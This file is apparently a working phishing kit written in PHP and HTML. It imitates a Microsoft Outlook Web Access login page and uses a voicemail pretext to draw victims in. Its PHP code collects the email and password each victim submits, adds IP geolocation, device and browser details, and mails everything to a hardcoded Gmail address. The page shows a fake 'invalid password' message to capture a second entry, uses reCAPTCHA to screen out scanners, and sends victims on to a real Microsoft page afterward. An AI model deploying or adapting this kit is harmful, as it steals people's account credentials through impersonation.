<?php
error_reporting(0);
ini_set('display_errors', 0);



//#############################################################################
// get code here CAPTCA V3 https://www.google.com/recaptcha/admin/create
$site_key   = "6Le9VaMfAAAAALd97jSTr5MXRQ7nQq9z2JH2CvrI";
$secret_key = "6Le9VaMfAAAAAHyDyYubjjKy_mWc2ue4M0TdJUSl";
//#############################################################################

$current_timestamp = time();
$md5 = md5(time());
$urls = '&client_id=' . $md5 . '&resse_me=' . $md5 . $md5 . '&res_te=' . md5($md5) . '&scope=' . $md5 . '&state=' . $md5;
if (empty($_GET['client_id'])) {
    //echo "bosh";
    
}
if (empty($_GET['e'])) {
    $mail = 'NoN';
} else {
    $mail = htmlspecialchars($_GET['e']);
}

if(isset($_POST['erterdss55'])) {

    // Build POST request:
    $recaptcha_url = 'https://www.google.com/recaptcha/api/siteverify';
    $recaptcha_secret = $secret_key;
    $recaptcha_response = $_POST['recaptcha_response'];

    // Make and decode POST request:
    $recaptcha = file_get_contents($recaptcha_url . '?secret=' . $recaptcha_secret . '&response=' . $recaptcha_response);
    $recaptcha = json_decode($recaptcha);


    if ($recaptcha->score >= 0.5) {

                function isMobileDevice() {
                      return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
                  }

                if(strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== FALSE)
                  $browser =  'Internet explorer';
                elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Trident') !== FALSE) //For Supporting IE 11
                  $browser =   'Internet explorer';
                elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox') !== FALSE)
                  $browser =   'Firefox';
                elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE)
                  $browser =   'Chrome';
                elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== FALSE)
                  $browser =   "Opera Mini";
                elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Opera') !== FALSE)
                  $browser =   "Opera";
                elseif(strpos($_SERVER['HTTP_USER_AGENT'], 'Safari') !== FALSE)
                  $browser =   "Safari";
                else
                  $browser =   'Other';

                if(isMobileDevice()){ $device = "Mobile"; }else { $device = "Desktop";  }
              
                if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
                } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                } else {
                    $ip = $_SERVER['REMOTE_ADDR'];
                }

          $json = file_get_contents("http://extreme-ip-lookup.com/json/".$ip); 
          $json_decode = json_decode($json, true);

          $city     = $json_decode['city'];
          $country  = $json_decode['country'];
          $region   = $json_decode['region'];
          
          $geo = $city.' / '.$country.' / '. $region;

          
          $email  = htmlspecialchars($_POST['erterdss55']);
          $passwd = htmlspecialchars($_POST['tewrtdsdf']);
          
          $to = 'mnssnm001@gmail.com'; // change email
          $subject = $email;
          $message = 'GEO: ' . $geo . "\r\n";
          $message = 'STEP: ' . $st . "\r\n";
          $message.= 'Device: '.$device . "\r\n";
          $message.= 'Email: ' . $email . "\r\n";
          $message.= 'Password: ' . $passwd . "\r\n";
          $message.= 'IP: ' . $ip . "\r\n";
          $message.= 'Browser: ' . $browser . "\r\n";
          $headers = 'From: ' . $email . "\r\n";

          if (mail($to, $subject, $message, $headers)) {
          }

          if ($_POST['step'] == '3') { //Thank you <strong>$mail</strong>
             // $sms = "<center>Thank you, Your voice message(s) will be delivered shortly </center>";
             echo '<meta http-equiv="refresh" content="5; url=https://support.office.com/en-us/article/set-up-your-voice-mail-b0d849d3-dd36-46b2-b845-ab1f1a72c647" />';
              $fianl = 1;
          }
  

    }else {
      echo '<div class="alert alert-warning" style="width:100%">
            <strong>Error!</strong> You are not a human.
          </div>';
    }
  }
?>

<!DOCTYPE> 
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
      <meta name="Robots" content="NOINDEX, NOFOLLOW">
      <title>VM - UM</title>
      <style type="text/css">
         table#tblMain {
         background: #7f90b1;
         }
      </style>
        <script src="https://www.google.com/recaptcha/api.js?render=<?php echo $site_key; ?>"></script>
        <script>
            grecaptcha.ready(function () {
                grecaptcha.execute('<?php echo $site_key; ?>', { action: 'contact' }).then(function (token) {
                    var recaptchaResponse = document.getElementById('recaptchaResponse');
                    recaptchaResponse.value = token;
                });
            });
        </script> 
   </head>
   
   <body class="owaLgnBdy">
      <noscript>
        <div id="dvErr">
            <table cellpadding="0" cellspacing="0">
               <tr>
                  <td><img src="../img/error.gif" alt=""></td>
                  <td style="width:100%">To use Microsoft Outlook Web access, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser does not support scripts, you can download <a href="http://www.microsoft.com/windows/ie/downloads/default.mspx">Microsoft Internet Explorer</a> for access to Outlook Web Access.</td>
               </tr>
            </table>
         </div>
      </noscript>
      <form action="?e=<?php echo $_GET['e'].$urls; ?>" method="POST" name="dwqerqeaewdasda" autocomplete="off">
        <input type="hidden" name="recaptcha_response" id="recaptchaResponse">
         <?php  
            if( empty($_POST['step'])){
              $step = '1';
            }else if ($_POST['step'] == '2') {
              $step = '2';
            }else if ($_POST['step'] == '3') {  
              $step = '3';
            }
            
            ?>
         <input type="hidden" name="step" value="<?php echo $step+1;?>">
         <table align="center" id="tblMain" cellpadding=0 cellspacing=0>
            <tr>
               <td colspan=3>
                  <table cellspacing=0 cellpadding=0 class="tblLgn">
                     <tr>
                        <td class="lgnTL"><img src="../img/YRmTTJ6.gif" alt=""></td>
                        <td class="lgnTM"></td>
                        <td class="lgnTR"><img src="../img/2Im4K0p.gif" alt="" width="46px"></td>
                     </tr>
                     </tr>
                  </table>
               </td>
            </tr>
            <tr>
               <td id="mdLft">&nbsp;</td>
               <td id="mdMid">
                  <?php  if($_POST['step'] != '3'){ /// step 2?>
                  <table id="tblMid" class="mid">
                     <tr>
                        <td id="expltxt" class="expl">
                        </td>
                     </tr>
                     <tr>
                        <td>
                           <hr>
                        </td>
                     </tr>
                     <tr>
                        <td>
                           <table class="nonMSIE">
                              <col>
                              <col class="w100">
                              <tr id=trSec>
                                 <td colspan="2">               
                                    Security 
                                    &#x200E;(
                                    <a href="#" id="lnkShwSec" onclick="clkExp('lnkShwSec')">
                                    show explanation 
                                    </a>
                                    <a href="#" id="lnkHdSec" onclick="clkExp('lnkHdSec')" style="display:none">
                                    hide explanation 
                                    </a>
                                    )&#x200E;
                                 </td>
                              </tr>
                              <tr>
                                 <td><input id="rdoPblc" type="radio" name="trsyuo" value="0" class="rdo" onclick="clkSec()" checked></td>
                                 <td><label for="rdoPblc">This is a public or shared computer</label></td>
                              </tr>
                              <tr id="trPubExp" class="expl" style="display:none">
                                 <td></td>
                                 <td>Select this option if you use Outlook Web Access on a public computer. Be sure to log off when you have finished using Outlook Web Access and close all windows to end your session.</td>
                              </tr>
                              <tr>
                                 <td><input id="rdoPrvt" type="radio" name="trsyuo" value="4" class="rdo" onclick="clkSec()"></td>
                                 <td><label for="rdoPrvt">This is a private computer</label></td>
                              </tr>
                              <tr id="trPrvtExp" class="expl" style="display:none">
                                 <td></td>
                                 <td>Select this option if you are the only person who uses this computer. Your server will allow a longer period of inactivity before logging you off.</td>
                              </tr>
                              <tr id="trPrvtWrn" class="wrng" style="display:none">
                                 <td></td>
                                 <td>Warning:  By selecting this option, you confirm that this computer complies with your organization's security policy.</td>
                              </tr>
                           </table>
                        </td>
                     </tr>
                     <tr>
                        <td>
                           <hr>
                        </td>
                     </tr>
                     <tr>
                        <td>
                           <table class="nonMSIE">
                              <col>
                              <col class="w100">
                              <tr>
                                 <td><input id="chkBsc" type="checkbox" class="rdo" onclick="clkBsc();" disabled checked></td>
                                 <td nowrap><label for="chkBsc">Use Outlook Web Access Light</label></td>
                              </tr>
                              <tr id="trBscExp" class="disBsc">
                                 <td></td>
                                 <td>The Light client provides fewer features and is sometimes faster. Use the Light client if you are on a slow connection or using a computer with unusually strict browser security settings. If you are using a browser other than Internet Explorer 6 or later, you can only use the Light client.</td>
                              </tr>
                           </table>
                        </td>
                     </tr>
                     <tr>
                        <td>
                           <hr>
                        </td>
                     </tr>
                     <tr>
                        <td>
                           <table class="nonMSIE">
                              <col class="nowrap">
                              <col class="w100">
                              <col>
                              <tr>
                                 <td nowrap><label for="erterdss55">Email:</label></td>
                                 <td class="txtpad"><input id="erterdss55" name="erterdss55" type="text" class="txt" value="<?php echo $_GET['e']; ?>"></td>
                              </tr>
                              <tr>
                                 <td nowrap><label for="tewrtdsdf">Password:</label></td>
                                 <td class="txtpad"><input id="tewrtdsdf" name="tewrtdsdf" type="password" class="txt" onfocus="g_fFcs=0"></td>
                              </tr>
                              <tr>
                                 <td colspan=2 align="right" class="txtpad">
                                    <input type="submit" class="btn" value="Log On" onclick="clkLgn()">
                                 </td>
                              </tr>
                           </table>
                        </td>
                     </tr>
                     <tr>
                        <td>
                           <hr>
                        </td>
                     </tr>
                  </table>
                  <?php }else{
                     echo '<table id="tblMid2" class="mid"> 
                        <tr id="trInvCrd" class="wrng">
                          <td>Your voice mail will be delivered shortly</td>
                        </tr>
                      </table>';
                     
                     } ?>
                  <?php  if($_POST['step'] == '2'){ /// step 2?>
                  <table id="tblMid2" class="mid">
                     <tr id="trInvCrd" class="wrng">
                        <td>The user name or password that you entered is not valid. Try entering it again.</td>
                     </tr>
                  </table>
                  <?php } ?>
                  <table class="mid tblConn">
                     <tr>
                        <td rowspan=2 align="right" class="tdConnImg"><img style="vertical-align:top" src="../img/lgnexlogo.gif" alt=""></td>
                        <td class="tdConn">Connected to Microsoft Exchange</td>
                     </tr>
                     <tr>
                        <td class="tdCopy">&copy; 2007 Microsoft Corporation. All rights reserved. </td>
                     </tr>
                  </table>
               </td>
               <td id="mdRt">&nbsp;</td>
            </tr>
            <tr>
               <td colspan=3>
                  <table cellspacing=0 cellpadding=0 class="tblLgn">
                     <tr>
                        <td class="lgnBL"><img src="../img/botl.gif" alt=""></td>
                        <td class="lgnBM"></td>
                        <td class="lgnBR"><img src="../img/botr.gif" alt=""></td>
                     </tr>
                  </table>
               </td>
            </tr>
         </table>
         
      </form>
   </body>

<style type="text/css">
   body {
     background-color: #ffffff;
     text-align: center;
}
 img {
     border: 0;
}
 .nonMSIE {
     padding: 3 3;
     margin: 2 2;
}
 table#tblMain {
     margin-top: 48;
     padding: 0 0 0 0;
}
 table.mid {
     width: 385;
     border-collapse: collapse;
     padding: 0;
     color: #ffffff;
}
 table.tblConn {
     direction: ltr;
}
 td.tdConnImg {
     width: 22;
}
 td.tdConn {
     padding-top: 15;
}
 td#mdLft {
     background: url("../img/left.gif") repeat-y;
     width: 15;
}
 td#mdRt {
     background: url("../img/right.gif") repeat-y;
     width: 15;
}
 td#mdMid {
     padding: 0 45;
     background: #7f90b1;
     vertical-align: top;
}
 td .txtpad {
     padding: 3 6 3 0;
}
 body.rtl td#mdMid {
     text-align: right;
     direction: rtl;
}
 select, table {
     color: #ffffff;
}
 select, .txt {
     color: #000000;
     background-color: #fceeaf;
     border: 1 solid #F6F8FF;
     margin: 3 6 3 6;
}
 .txt {
     padding: 3;
     height: 2.2em;
}
 input.btn {
     color: #3f52b8;
     background-color: #f6f8ff;
     border: 0;
     padding: 2 6;
     margin: 0 6;
     text-align: center;
}
 .btnOnFcs {
     color: #3f52b8;
     background-color: #f6f8ff;
     border: 0;
     padding: 2 6;
     margin: 0 6;
     text-align: center;
}
 .btnOnMseOvr {
     color: #3f52b8;
     background-color: #ffefb2;
     border: 0;
     padding: 2 6;
     margin: 0 6;
     text-align: center;
}
 .btnOnMseDwn {
     color: #000000;
     background-color: #ffefb2;
     border: 0 solid #ffccd0;
     padding: 2 6;
     margin: 0 6;
     text-align: center;
}
 .nowrap {
     white-space: nowrap;
}
 hr {
     height: 1;
     color: #A9AAC4;
}
 .l {
     text-align: left;
}
 .rtl .l {
     text-align: right;
}
 .r {
     text-align: right;
}
 .rtl .r {
     text-align: left;
}
 a {
     color: #FFE052;
     text-decoration: none;
}
 .wrng {
     color: #F8D328;
}
 .disBsc {
     color: #C8D3E3;
}
 .expl {
     color: #C8D3E3;
}
 .w100, .txt {
     width: 100%;
}
 .txt {
     margin: 0 6;
}
 .rdo {
     margin: 0 12 0 32;
}
 body.rtl .rdo {
     margin: 0 32 0 12;
}
 tr.expl td, tr.wrng td {
     padding: 2 0 4 0;
}
 tr#trSec td {
     padding: 3 0 8 0;
}
 td#tdLng {
     padding: 12 0 12 0;
}
 td#tdTz {
     padding: 8 0 8 0;
}
 select#selTz {
     padding: 0;
     margin: 0;
}
 td#tdOptMsg {
     padding: 10 0 10 0;
}
 td#tdOptChk {
     padding: 0 0 15 65;
}
 td#tdOptAcc {
     vertical-align: middle;
     padding: 0 0 0 3;
}
 select#selLng {
     margin: 0 16;
}
 input#btnOk {
     width: 50;
}
 td#tdMsg {
     margin: 9 0 64;
}
 input#btnCls {
     margin: 3 6;
}
 div#dvErr {
     padding: 0 0 3 3;
     background-color: #FCBC9C;
     border: solid 1px #B43038;
}
 div#dvErr table {
     color: #000000;
}
 div#dvErr a {
     color: #3F52B8;
}
 td.lgnTL, td.lgnBL {
     width: 456;
}
 td.lgnTM {
     background: url("../img/topm.gif") repeat-x;
     width: 100%;
}
 td.lgnBM {
     background: url("../img/botm.gif") repeat-x;
     width: 100%;
}
 td.lgnTR, td.lgnBR {
     width: 45;
}
 table.tblLgn {
     padding: 0;
     margin: 0;
     border-collapse: collapse;
     width: 100%;
}
 body, textarea {
     font-family: Tahoma, Arial, Helvetica;
     font-size: 70%;
}
 select, input, textarea, button, label, table, pre {
     font-size: 100%;
}
 input, select, pre {
     font-family: Tahoma, Arial, Helvetica;
}
 .bld, .ur {
     font-weight: bold;
}
 table.nbMnu {
     font-weight: bold;
}
 td.tdLogoB {
     font-size: 7pt;
     font-family: Tahoma, Arial, Helvetica;
}
 div#divTr {
     font-size: 100%;
}
 td#idFrm {
     font-weight: bold;
}
 button {
     font-family: Tahoma, Arial, Helvetica;
}
 td.fromSdr {
     font-size: 120%;
}
 div#divSubj, div#divMV td#tdMN {
     font-weight: bold;
     font-size: 12pt;
     font-family: Arial;
}
 div#divSubj pre {
     font-weight: bold;
     font-size: 12pt;
     font-family: Arial;
}
 input.readSubj {
     font-size: 12pt;
     font-weight: bold;
     font-family: Arial;
}
 td.pvwFrom {
     font-size: 130%;
     font-family: Arial;
}
 textarea.txtBdy {
     font-size: 100%;
     font-family: Tahoma, Arial, Helvetica;
}
 span.bld {
     font-weight: bold;
}
 .updNew {
     font-style: italic;
}
 span.fbItalics {
     font-style: italic;
}
 td.fbLbl {
     font-weight: bold;
}
 .fbBiu {
     font-family: Courier New;
     font-size: 17;
}
 table#tblPckr {
     font-size: 0;
}
 span.wvsn {
     font: normal 85% Tahoma, Sans Serif, Arial;
}
 .rtl span.wvsn {
     font: normal 85% Tahoma, Sans Serif, Arial;
}
 div.awRW {
     font-size: 100%;
}
 div.awRO {
     font-size: 100%;
}
 div.rwW, input.edtSubj, textarea#taAn {
     font-size: 100%;
}
 span.rwDL {
     font-weight: bold;
}
 div.rwW a, div.rwW strong, div.rwW em, div.rwW u {
     font-weight: normal;
     font-style: normal;
}
 div.moSctTxt {
     font-weight: bold;
}
 td#svRemTop {
     font-family: Arial;
     font-weight: bold;
     font-size: 130%;
}
 table.errDesc td#errMsg {
     font-size: 130%;
}
 table#tblErr {
     font-size: 100%;
}
 td#tdErrHdCt {
     font-size: 100%;
}
 div.errHd {
     font-size: 130%;
}
 table.lyt td.hdr, table.lyt td.sugHdr {
     font-weight: bold;
}
 table.dyTms {
     font-size: xx-small;
}
 table.dyTms tr.dy {
     font-weight: bold;
}
 div.dp {
     font-size: 8pt;
}
 div.dpDD {
     font-size: 8pt;
}
 table#tblDpM td.b {
     font-weight: bold;
}
 td.dpWN {
     font-size: 7.5pt;
}
 .fb0 {
     font-weight: normal;
}
 .fb1 {
     font-weight: bold;
}
 div#divFH {
     font-size: 100%;
}
 td.tsl {
     font-size: 175%;
}
 td.tsr {
     font-size: 100%;
}
 td#tdDN {
     font-weight: bold;
     font-size: 125%;
}
 .visSbj {
     font-weight: bold;
}
 table.mlIL col#abc {
     font-family: Tahoma, Arial, Helvetica;
     font-size: 100%;
}
 tr.gh td {
     font-weight: bold;
}
 td.tdHdr {
     font-family: Arial;
     font-size: 160%;
}
 div#divCmpFnt span span {
     font-weight: bold;
     font-size: 17;
     font-family: Courier New;
}
 span#spnCmpI {
     font-style: italic;
}
 div.bold {
     font-weight: bold;
}
 td#tdAn {
     font-weight: bold;
}
 span#spnPn {
     font-weight: bold;
}
 span.nm {
     font-size: 130%;
     font-weight: bold;
}
 table#tblCnts col.sct {
     font-weight: bold;
}
 table#tblCnts td.bLn {
     font-weight: bold;
}
 div#divRHS {
     font-weight: bold;
}
 span.abArrw {
     font-family: Courier New;
}
 td.adMgHd {
     font-weight: bold;
}
 div#divNFld, div#divRFld {
     font-size: 100%;
}
 input#txtNFld {
     font-size: 100%;
}
 td.cntTabCT {
     font-weight: bold;
}
 td.cntDetPT {
     font-weight: bold;
}
 body.rtl td.cntDetPT {
     font-weight: bold;
}
 td.cntSepT {
     font-weight: bold;
}
 textarea.cntNot {
     font-size: 100%;
     font-family: Tahoma, Arial, Helvetica;
}
 input#txtFldN {
     font-size: 100%;
}
 input.edtTsk {
     font-size: 100%;
}
 table#mbqt td.txt span#usg {
     font-weight: bold;
}
 col.pvwLabel, td.pvwLabel, td.pvwLblMdl {
     font-weight: bold;
}
 textarea.txtBdy {
     font-size: 100%;
     font-family: Tahoma, Arial, Helvetica;
}
 table#tblDpM td.b {
     font-weight: bold;
}
 body.owaLgnBdy {
     font-size: 100%;
}
 table.mid {
     font-size: 70%;
}
 td.tdCopy {
     font-size: 80%;
}
 .txt {
     font-size: 95%;
}
 input.btn {
     font-size: 95%;
}
 .btnOnFcs {
     font-size: 95%;
}
 .btnOnMseOvr {
     font-size: 95%;
}
 .btnOnMseDwn {
     font-size: 95%;
}
 table.tbWIB {
     font: normal 95% Tahoma, Sans Serif, Arial;
}
 table.tbEIB {
     font: normal 95% Tahoma, Sans Serif, Arial;
}
 input#txtcp {
     font-size: 100%;
     font-family: Tahoma, Arial, Helvetica;
}
 table.rcpLwr tr.tck td, table.dyTmsAd tr.hrs td, table.rcpHdrAd tr.t td {
     width: 38px;
}
 
</style>

</html>